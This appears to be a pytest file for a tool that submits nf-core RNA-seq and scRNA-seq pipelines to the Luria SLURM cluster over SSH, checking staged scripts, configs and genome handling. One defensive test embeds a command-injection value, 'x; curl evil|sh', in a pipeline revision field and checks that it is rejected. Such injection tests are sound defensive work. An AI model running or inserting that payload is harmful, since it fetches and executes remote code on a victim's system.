import yaml
from pathlib import Path
import chat_nextseek.luria.submitter as sub

LE = {"user": "cdemu", "host": "luria.mit.edu", "key": "/k", "working_path": "/net/x"}


def _fixture(tmp_path):
    """A launch.yml + a co-located samplesheet.csv (the submitter's fallback source)."""
    ss = tmp_path / "samplesheet.csv"
    ss.write_text("sample,fastq_1\nA,a.fq.gz\n")
    (tmp_path / "launch.yml").write_text(yaml.safe_dump({"launch": [{
        "name": "nfcore_rnaseq", "pipeline": "nf-core/rnaseq", "revision": "3.16.1",
    }]}))
    return tmp_path / "launch.yml", ss


def _raise(*a, **k):
    raise RuntimeError("boom")


def _patch_transport(monkeypatch):
    calls = {"ssh": [], "scp": []}
    monkeypatch.setattr(sub, "prepare_key", lambda k: "/tmp/fake_key")
    monkeypatch.setattr(sub, "ssh_run",
                        lambda le, cmd, *, key_path: (calls["ssh"].append(cmd),
                                                      "Submitted batch job 4821\n")[1])
    monkeypatch.setattr(sub, "scp_file",
                        lambda le, local, remote, *, key_path: calls["scp"].append((str(local), remote)))
    return calls


def test_submit_luria_happy_path(tmp_path, monkeypatch):
    launch, ss = _fixture(tmp_path)
    calls = _patch_transport(monkeypatch)
    runs = sub.submit_luria(str(launch), luria_env=LE, resources={"cpus": 16})
    assert len(runs) == 1
    ref = runs[0]
    assert ref["job_id"] == "4821"
    assert ref["remote_dir"].startswith("/net/x/runs/nfcore_rnaseq_")
    assert ref["log"].endswith("/nfcore_rnaseq.out")
    assert any(c.startswith("mkdir -p") for c in calls["ssh"])
    assert any("sbatch run.sh" in c for c in calls["ssh"])
    # four files staged: run.sh + luria.config (-c) + params.yml (-params-file) + samplesheet
    remotes = {remote.rsplit("/", 1)[1] for _, remote in calls["scp"]}
    assert remotes == {"run.sh", "luria.config", "params.yml", "samplesheet.csv"}


def test_submit_luria_stages_state_samplesheet_and_runsh_uses_cli_flags(tmp_path, monkeypatch):
    real_sheet = tmp_path / "my_samplesheet.csv"
    real_sheet.write_text("sample,fastq_1\nA,a.fq.gz\n")
    (tmp_path / "launch.yml").write_text(yaml.safe_dump({"launch": [{
        "name": "nfcore_rnaseq", "pipeline": "nf-core/rnaseq", "revision": "3.16.1"}]}))
    staged = {}
    monkeypatch.setattr(sub, "prepare_key", lambda k: "/tmp/fake_key")
    monkeypatch.setattr(sub, "ssh_run", lambda le, cmd, *, key_path: "Submitted batch job 7\n")

    def fake_scp(le, local, remote, *, key_path):
        if remote.endswith("/samplesheet.csv"):
            staged["sheet_src"] = str(local)
        if remote.endswith("/run.sh"):
            staged["run_sh"] = Path(local).read_text()

    monkeypatch.setattr(sub, "scp_file", fake_scp)
    runs = sub.submit_luria(str(tmp_path / "launch.yml"), luria_env=LE, samplesheet_local=str(real_sheet))
    assert len(runs) == 1
    # staged the caller-provided local samplesheet (not a bucket path)
    assert staged["sheet_src"] == str(real_sheet)
    # run.sh drives the run via CLI flags against the staged sheet + the Luria run dir
    assert "--input samplesheet.csv" in staged["run_sh"]
    assert "--genome GRCh38" in staged["run_sh"]
    assert "cd /net/x/runs/nfcore_rnaseq_" in staged["run_sh"]
    assert "/orcd" not in staged["run_sh"]


def test_submit_luria_skips_when_env_incomplete(tmp_path, monkeypatch):
    launch, ss = _fixture(tmp_path)
    _patch_transport(monkeypatch)
    runs = sub.submit_luria(str(launch), luria_env={"user": "u", "key": None, "working_path": "/p", "host": "luria.mit.edu"})
    assert runs == []


def test_submit_luria_missing_launch_returns_empty():
    assert sub.submit_luria("/no/such/launch.yml", luria_env=LE) == []


def test_submit_luria_cleans_run_tmp_on_transport_error(tmp_path, monkeypatch):
    launch, ss = _fixture(tmp_path)
    created = []
    real_mkstemp = sub.tempfile.mkstemp

    def tracking_mkstemp(*a, **k):
        fd, path = real_mkstemp(*a, **k)
        created.append(path)
        return fd, path

    monkeypatch.setattr(sub.tempfile, "mkstemp", tracking_mkstemp)
    monkeypatch.setattr(sub, "prepare_key", lambda k: "/tmp/fake_key")
    monkeypatch.setattr(sub, "ssh_run", lambda le, cmd, *, key_path: "Submitted batch job 1\n")
    # scp fails AFTER the run.sh temp file was created + written
    monkeypatch.setattr(sub, "scp_file", _raise)
    runs = sub.submit_luria(str(launch), luria_env=LE)
    assert runs == []  # entry failed on transport
    import os as _os
    assert created and all(not _os.path.exists(p) for p in created)  # run.sh temp cleaned up


def test_submit_luria_one_bad_entry_does_not_abort_siblings(tmp_path, monkeypatch):
    ss = tmp_path / "samplesheet.csv"
    ss.write_text("sample,fastq_1\nA,a.fq.gz\n")
    (tmp_path / "launch.yml").write_text(yaml.safe_dump({"launch": [
        {"name": "bad"},  # missing pipeline/revision -> skipped
        {"name": "good", "pipeline": "nf-core/rnaseq", "revision": "3.16.1"},
    ]}))
    _patch_transport(monkeypatch)
    runs = sub.submit_luria(str(tmp_path / "launch.yml"), luria_env=LE)
    assert len(runs) == 1
    assert runs[0]["run_name"] == "good"


def test_submit_luria_skips_entry_with_injected_revision(tmp_path, monkeypatch):
    real_sheet = tmp_path / "samplesheet.csv"
    real_sheet.write_text("sample\nA\n")
    (tmp_path / "launch.yml").write_text(yaml.safe_dump({"launch": [{
        "name": "evil", "pipeline": "nf-core/rnaseq", "revision": "x; curl evil|sh"}]}))
    _patch_transport(monkeypatch)
    runs = sub.submit_luria(str(tmp_path / "launch.yml"), luria_env=LE, samplesheet_local=str(real_sheet))
    assert runs == []  # injected revision -> render raises -> entry skipped, never launched


def test_submit_luria_stages_params_yml_and_luria_config(tmp_path, monkeypatch):
    real_sheet = tmp_path / "samplesheet.csv"
    real_sheet.write_text("sample,fastq_1\nA,a.fq.gz\n")
    (tmp_path / "launch.yml").write_text(yaml.safe_dump({"launch": [{
        "name": "nfcore_rnaseq", "pipeline": "nf-core/rnaseq", "revision": "3.16.1"}]}))
    staged = {}
    monkeypatch.setattr(sub, "prepare_key", lambda k: "/tmp/fake_key")
    monkeypatch.setattr(sub, "ssh_run", lambda le, cmd, *, key_path: "Submitted batch job 9\n")

    def fake_scp(le, local, remote, *, key_path):
        if remote.endswith("/params.yml"):
            staged["params"] = Path(local).read_text()
        elif remote.endswith("/luria.config"):
            staged["config"] = Path(local).read_text()
        elif remote.endswith("/run.sh"):
            staged["run_sh"] = Path(local).read_text()

    monkeypatch.setattr(sub, "scp_file", fake_scp)
    sub.submit_luria(
        str(tmp_path / "launch.yml"), luria_env=LE, samplesheet_local=str(real_sheet),
        genome="GRCm39",
        launch_params={"genome": "GRCm39", "input": "s3://bucket/x", "outdir": "/orcd/out",
                       "aligner": "star_salmon", "gencode": True, "save_reference": True},
    )
    # run.sh wires both generated files in
    assert "-c luria.config" in staged["run_sh"]
    assert "-params-file params.yml" in staged["run_sh"]
    # params.yml carries curated params but NOT the CLI-owned keys (input/outdir/genome)
    params = yaml.safe_load(staged["params"])
    assert params["aligner"] == "star_salmon"
    assert params["gencode"] is True
    assert params["save_reference"] is True
    assert "genome" not in params and "input" not in params and "outdir" not in params
    # luria.config resolved REFS_ROOT under the Luria working path (LE working_path=/net/x)
    assert "/net/x/refs/GRCm39.primary_assembly.genome.fa.gz" in staged["config"]
    assert "{{REFS_ROOT}}" not in staged["config"]


def test_submit_luria_scrnaseq_injects_fasta_gtf_and_knee_config(tmp_path, monkeypatch):
    real_sheet = tmp_path / "samplesheet.csv"
    real_sheet.write_text("sample,fastq_1\nA,a.fq.gz\n")
    (tmp_path / "launch.yml").write_text(yaml.safe_dump({"launch": [{
        "name": "nfcore_scrnaseq", "pipeline": "https://github.com/nf-core/scrnaseq", "revision": "2.7.1"}]}))
    staged = {}
    monkeypatch.setattr(sub, "prepare_key", lambda k: "/tmp/fake_key")
    monkeypatch.setattr(sub, "ssh_run", lambda le, cmd, *, key_path: "Submitted batch job 5\n")

    def fake_scp(le, local, remote, *, key_path):
        if remote.endswith("/luria.config"):
            staged["config"] = Path(local).read_text()
        elif remote.endswith("/run.sh"):
            staged["run_sh"] = Path(local).read_text()

    monkeypatch.setattr(sub, "scp_file", fake_scp)
    sub.submit_luria(str(tmp_path / "launch.yml"), luria_env=LE, samplesheet_local=str(real_sheet),
                     genome="Mfas6.0", launch_params={"protocol": "dropseq"},
                     process_args={"SIMPLEAF_QUANT": "-r cr-like --knee"})
    # run.sh: explicit --fasta/--gtf for Mfas6.0 (LE working_path=/net/x -> /net/x/refs), path > iGenomes
    assert "--fasta /net/x/refs/Macaca_fascicularis.Macaca_fascicularis_6.0.dna.toplevel.fa.gz" in staged["run_sh"]
    assert "--gtf /net/x/refs/Macaca_fascicularis.Macaca_fascicularis_6.0.116.gtf.gz" in staged["run_sh"]
    # luria.config: genomes map + the SIMPLEAF_QUANT block keeping the base '-r cr-like' + --knee
    assert "'Mfas6.0'" in staged["config"]
    assert "withName: '.*:SIMPLEAF_QUANT'" in staged["config"]
    assert "ext.args = '-r cr-like --knee'" in staged["config"]


def test_submit_luria_scrnaseq_star_runsh_uses_vendored_clone(tmp_path, monkeypatch):
    real_sheet = tmp_path / "samplesheet.csv"
    real_sheet.write_text("sample,fastq_1\nA,a.fq.gz\n")
    (tmp_path / "launch.yml").write_text(yaml.safe_dump({"launch": [{
        "name": "nfcore_scrnaseq", "pipeline": "https://github.com/nf-core/scrnaseq", "revision": "2.7.1"}]}))
    staged = {}
    monkeypatch.setattr(sub, "prepare_key", lambda k: "/tmp/fake_key")
    monkeypatch.setattr(sub, "ssh_run", lambda le, cmd, *, key_path: "Submitted batch job 6\n")

    def fake_scp(le, local, remote, *, key_path):
        if remote.endswith("/run.sh"):
            staged["run_sh"] = Path(local).read_text()

    monkeypatch.setattr(sub, "scp_file", fake_scp)
    # aligner=star -> route to the vendored patched clone (LE working_path=/net/x), no -r
    sub.submit_luria(str(tmp_path / "launch.yml"), luria_env=LE, samplesheet_local=str(real_sheet),
                     genome="Mfas6.0", launch_params={"aligner": "star", "protocol": "dropseq"})
    assert "nextflow run /net/x/pipelines/scrnaseq-2.7.1-star-patched -profile singularity" in staged["run_sh"]
    assert "-r 2.7.1" not in staged["run_sh"]


def test_submit_luria_scrnaseq_alevin_runsh_uses_stock_remote(tmp_path, monkeypatch):
    real_sheet = tmp_path / "samplesheet.csv"
    real_sheet.write_text("sample,fastq_1\nA,a.fq.gz\n")
    (tmp_path / "launch.yml").write_text(yaml.safe_dump({"launch": [{
        "name": "nfcore_scrnaseq", "pipeline": "nf-core/scrnaseq", "revision": "2.7.1"}]}))
    staged = {}
    monkeypatch.setattr(sub, "prepare_key", lambda k: "/tmp/fake_key")
    monkeypatch.setattr(sub, "ssh_run", lambda le, cmd, *, key_path: "Submitted batch job 8\n")

    def fake_scp(le, local, remote, *, key_path):
        if remote.endswith("/run.sh"):
            staged["run_sh"] = Path(local).read_text()

    monkeypatch.setattr(sub, "scp_file", fake_scp)
    sub.submit_luria(str(tmp_path / "launch.yml"), luria_env=LE, samplesheet_local=str(real_sheet),
                     genome="Mfas6.0", launch_params={"aligner": "alevin", "protocol": "dropseq"})
    assert "nextflow run nf-core/scrnaseq -r 2.7.1 -profile singularity" in staged["run_sh"]
    assert "/pipelines/scrnaseq-2.7.1-star-patched" not in staged["run_sh"]


def test_submit_luria_threads_genome_into_runsh(tmp_path, monkeypatch):
    real_sheet = tmp_path / "samplesheet.csv"
    real_sheet.write_text("sample,fastq_1\nA,a.fq.gz\n")
    (tmp_path / "launch.yml").write_text(yaml.safe_dump({"launch": [{
        "name": "nfcore_rnaseq", "pipeline": "nf-core/rnaseq", "revision": "3.16.1"}]}))
    staged = {}
    monkeypatch.setattr(sub, "prepare_key", lambda k: "/tmp/fake_key")
    monkeypatch.setattr(sub, "ssh_run", lambda le, cmd, *, key_path: "Submitted batch job 3\n")

    def fake_scp(le, local, remote, *, key_path):
        if remote.endswith("/run.sh"):
            staged["run_sh"] = Path(local).read_text()

    monkeypatch.setattr(sub, "scp_file", fake_scp)
    # a mouse cohort resolves to GRCm39 — must NOT align to human GRCh38
    sub.submit_luria(str(tmp_path / "launch.yml"), luria_env=LE,
                     samplesheet_local=str(real_sheet), genome="GRCm39")
    assert "--genome GRCm39" in staged["run_sh"]
    assert "GRCh38" not in staged["run_sh"]
